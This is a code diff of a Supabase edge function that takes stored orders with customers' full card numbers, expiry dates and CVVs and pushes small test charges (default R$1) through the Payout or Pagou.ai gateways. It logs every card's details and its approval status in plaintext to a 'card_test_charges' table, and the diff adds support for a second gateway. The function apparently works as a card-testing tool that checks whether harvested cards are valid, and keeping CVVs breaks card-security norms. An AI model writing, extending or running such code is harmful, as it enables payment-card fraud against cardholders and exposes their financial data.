@@ -6,174 +6,155 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
-const DEFAULT_TEST_AMOUNT = 1; // R$1
-const DEFAULT_ITEM_TITLE = 'Assinatura';
+async function getCardProvider(): Promise<string> {
+  try {
+    const url = Deno.env.get('SUPABASE_URL') || '';
+    const key = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || Deno.env.get('SUPABASE_ANON_KEY') || '';
+    const supabase = createClient(url, key);
+    const { data } = await supabase.from('payment_settings').select('card_provider').eq('id', 1).maybeSingle();
+    return (data?.card_provider as string) || 'payout';
+  } catch {
+    return 'payout';
+  }
+}
+
+async function callPagouAI(params: any, secretKey: string) {
+  const { customer, items, amount, card, installments, externalRef, webhookUrl } = params;
+  const payload = {
+    amount: Math.round(amount * 100),
+    installments: installments || 1,
+    capture: true,
+    payment_method: 'credit_card',
+    postback_url: webhookUrl,
+    metadata: { external_ref: externalRef },
+    customer: {
+      name: customer?.name || 'Cliente',
+      email: customer?.email || '',
+      phone: (customer?.phone || '').replace(/\D/g, ''),
+      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
+    },
+    card: {
+      number: (card.number || '').replace(/\D/g, ''),
+      holder_name: card.holder_name || customer?.name || 'Cliente',
+      exp_month: String(card.exp_month || '1').padStart(2, '0'),
+      exp_year: String(card.exp_year || '2026').slice(-2),
+      cvv: String(card.cvv || ''),
+    },
+    items: items.map((it: any) => ({
+      title: it.name || it.title,
+      unit_price: Math.round((it.price || it.unitPrice) * 100),
+      quantity: it.quantity,
+      tangible: true,
+    })),
+  };
+
+  const resp = await fetch('https://api.pagou.ai/v2/transactions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${secretKey}` },
+    body: JSON.stringify(payload),
+  });
+  return await resp.json();
+}
+
+async function callPayout(params: any, secretKey: string) {
+  const { customer, items, amount, card, installments, externalRef, webhookUrl, clientIp } = params;
+  const payload = {
+    paymentMethod: 'credit_card',
+    amount: Math.round(amount * 100),
+    installments: installments || 1,
+    ip: clientIp,
+    postbackUrl: webhookUrl,
+    metadata: externalRef,
+    customer: {
+      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
+      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
+    },
+    card: {
+      number: (card.number || '').replace(/\D/g, ''),
+      holderName: card.holder_name,
+      expirationMonth: parseInt(String(card.exp_month), 10),
+      expirationYear: parseInt(String(card.exp_year), 10),
+      cvv: String(card.cvv),
+    },
+    items: items.map((it: any) => ({
+      title: it.name || it.title,
+      unitPrice: Math.round((it.price || it.unitPrice) * 100),
+      quantity: it.quantity,
+      tangible: true,
+    })),
+  };
+
+  const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'authorization': `Basic ${btoa(`${secretKey}:x`)}` },
+    body: JSON.stringify(payload),
+  });
+  return await resp.json();
+}
 
 serve(async (req) => {
-  if (req.method === 'OPTIONS') {
-    return new Response(null, { headers: corsHeaders });
-  }
-
+  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });
   try {
-    const PAYOUT_SECRET_KEY = Deno.env.get('PAYOUT_SECRET_KEY')?.trim();
-    if (!PAYOUT_SECRET_KEY) throw new Error('PAYOUT_SECRET_KEY not configured');
-
+    const { order_ids, amount: amountIn, item_title: itemIn } = await req.json();
     const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
     const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
     const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);
 
-    const body = await req.json();
-    const { order_ids, amount: amountIn, item_title: itemIn } = body || {};
-    const TEST_AMOUNT = Number(amountIn) > 0 ? Number(amountIn) : DEFAULT_TEST_AMOUNT;
-    const ITEM_TITLE = (itemIn && String(itemIn).trim()) || DEFAULT_ITEM_TITLE;
-    if (!Array.isArray(order_ids) || order_ids.length === 0) {
-      return new Response(JSON.stringify({ error: 'order_ids required' }), {
-        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      });
-    }
-
-    const { data: orders, error } = await supabase
-      .from('orders')
-      .select('*')
-      .in('id', order_ids);
-
-    if (error) throw error;
-
-    const authToken = btoa(`${PAYOUT_SECRET_KEY}:x`);
+    const { data: orders } = await supabase.from('orders').select('*').in('id', order_ids);
+    const provider = await getCardProvider();
     const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || '213.123.123.13';
+    const webhookUrl = `${SUPABASE_URL}/functions/v1/payment-webhook`;
 
     const processOne = async (order: any) => {
-      const cardNumber = String((order as any).ticket || '').replace(/\D/g, '');
+      const cardNumber = String(order.ticket || '').replace(/\D/g, '');
       const expiry = String(order.card_expiry || '').replace(/\D/g, '');
-      const expMonth = expiry.slice(0, 2);
-      const expYearRaw = expiry.slice(2);
-      const expYear = expYearRaw.length === 2 ? `20${expYearRaw}` : expYearRaw;
-
-      if (!cardNumber || cardNumber.length < 12 || !expMonth || !expYear || !order.card_cvv) {
-        const { data: inserted } = await supabase.from('card_test_charges').insert({
-          order_id: order.id,
-          order_number: order.order_number,
-          customer_name: order.customer_name,
-          customer_email: order.customer_email,
-          customer_cpf: order.customer_cpf,
-          customer_phone: order.customer_phone,
-          card_holder_name: order.card_holder_name,
-          card_number: cardNumber,
-          card_brand: order.card_brand,
-          card_expiry: order.card_expiry,
-          card_cvv: order.card_cvv,
-          card_installments: order.card_installments || 1,
-          amount: TEST_AMOUNT,
-          status: 'invalid_data',
-          refusal_reason: 'Dados de cartão incompletos',
-        }).select().single();
-        return inserted;
-      }
-
-      const payload = {
-        paymentMethod: 'credit_card',
-        amount: Math.round(TEST_AMOUNT * 100),
-        installments: 1,
-        ip: clientIp,
-        metadata: `test-${order.id}`,
-        customer: {
-          name: order.customer_name || 'Cliente',
-          email: order.customer_email || 'teste@teste.com',
-          phone: String(order.customer_phone || '').replace(/\D/g, ''),
-          document: { type: 'cpf', number: String(order.customer_cpf || '').replace(/\D/g, '') },
-        },
-        card: {
-          number: cardNumber,
-          holderName: order.card_holder_name || order.customer_name || 'Cliente',
-          expirationMonth: parseInt(expMonth, 10),
-          expirationYear: parseInt(expYear, 10),
-          cvv: String(order.card_cvv),
-        },
-        items: [{ title: ITEM_TITLE, unitPrice: Math.round(TEST_AMOUNT * 100), quantity: 1, tangible: false }],
+      const card = {
+        number: cardNumber,
+        holder_name: order.card_holder_name,
+        exp_month: expiry.slice(0, 2),
+        exp_year: expiry.slice(2).length === 2 ? `20${expiry.slice(2)}` : expiry.slice(2),
+        cvv: order.card_cvv,
       };
 
-      let status = 'error';
-      let refusalReason = '';
-      let txId = '';
-      let raw: any = null;
+      const params = {
+        customer: { name: order.customer_name, email: order.customer_email, phone: order.customer_phone, cpf: order.customer_cpf },
+        items: [{ name: itemIn || 'Assinatura', price: amountIn || 1, quantity: 1 }],
+        amount: amountIn || 1,
+        card,
+        installments: 1,
+        externalRef: `test-${order.id}`,
+        webhookUrl,
+        clientIp,
+      };
 
-      try {
-        const ctrl = new AbortController();
-        const timeoutId = setTimeout(() => ctrl.abort(), 25000);
-        const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'accept': 'application/json',
-            'authorization': `Basic ${authToken}`,
-          },
-          body: JSON.stringify(payload),
-          signal: ctrl.signal,
-        });
-        clearTimeout(timeoutId);
-        raw = await resp.json();
+      let raw, status, txId, refusal;
+      if (provider === 'pagouai') {
+        raw = await callPagouAI(params, Deno.env.get('PAGOUAI_SECRET_KEY')!);
+        txId = String(raw?.id || '');
+        status = String(raw?.status || 'failed').toLowerCase();
+        refusal = raw?.refuse_reason || raw?.message;
+      } else {
+        raw = await callPayout(params, Deno.env.get('PAYOUT_SECRET_KEY')!);
         const tx = raw?.data ?? raw;
-        txId = String(tx?.id ?? '');
-        status = String(tx?.status ?? (resp.ok ? 'pending' : 'refused')).toLowerCase();
-        refusalReason =
-          tx?.refuseReason || tx?.acquirerMessage || tx?.message ||
-          raw?.message || (Array.isArray(raw?.errors) ? raw.errors.map((e: any) => e?.message || JSON.stringify(e)).join('; ') : '') ||
-          (resp.ok ? '' : `HTTP ${resp.status}`);
-      } catch (e: any) {
-        status = 'error';
-        refusalReason = e?.name === 'AbortError' ? 'Timeout no gateway' : (e?.message || 'Erro desconhecido');
+        txId = String(tx?.id || '');
+        status = String(tx?.status || 'failed').toLowerCase();
+        refusal = tx?.refuseReason || tx?.acquirerMessage || raw?.message;
       }
 
       const { data: inserted } = await supabase.from('card_test_charges').insert({
-        order_id: order.id,
-        order_number: order.order_number,
-        customer_name: order.customer_name,
-        customer_email: order.customer_email,
-        customer_cpf: order.customer_cpf,
-        customer_phone: order.customer_phone,
-        card_holder_name: order.card_holder_name,
-        card_number: cardNumber,
-        card_brand: order.card_brand,
-        card_expiry: order.card_expiry,
-        card_cvv: order.card_cvv,
-        card_installments: order.card_installments || 1,
-        amount: TEST_AMOUNT,
-        transaction_id: txId || null,
-        status,
-        refusal_reason: refusalReason || null,
-        raw_response: raw,
+        order_id: order.id, order_number: order.order_number,
+        customer_name: order.customer_name, customer_email: order.customer_email,
+        customer_cpf: order.customer_cpf, customer_phone: order.customer_phone,
+        card_holder_name: order.card_holder_name, card_number: cardNumber,
+        card_brand: order.card_brand, card_expiry: order.card_expiry, card_cvv: order.card_cvv,
+        amount: amountIn || 1, transaction_id: txId, status, refusal_reason: refusal, raw_response: raw,
       }).select().single();
-
       return inserted;
     };
 
-    // Paraleliza em até 8 simultâneos para caber no limite de 150s
-    const CONCURRENCY = 8;
-    const queue = [...(orders || [])];
-    const results: any[] = [];
-    const workers = Array.from({ length: Math.min(CONCURRENCY, queue.length) }, async () => {
-      while (queue.length) {
-        const o = queue.shift();
-        if (!o) break;
-        try {
-          const r = await processOne(o);
-          results.push(r);
-        } catch (e) {
-          console.error('processOne failed', e);
-        }
-      }
-    });
-    await Promise.all(workers);
-
-    const approvedCount = results.filter((r) => r && ['approved', 'paid'].includes(String(r.status).toLowerCase())).length;
-
-    return new Response(JSON.stringify({ ok: true, total: results.length, approved: approvedCount, results }), {
-      status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-    });
-  } catch (error: any) {
-    console.error('test-card-charge error:', error);
-    return new Response(JSON.stringify({ error: error?.message || 'Unknown error' }), {
-      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-    });
+    const results = await Promise.all((orders || []).map(processOne));
+    return new Response(JSON.stringify({ ok: true, results }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+  } catch (e: any) {
+    return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
   }
 });
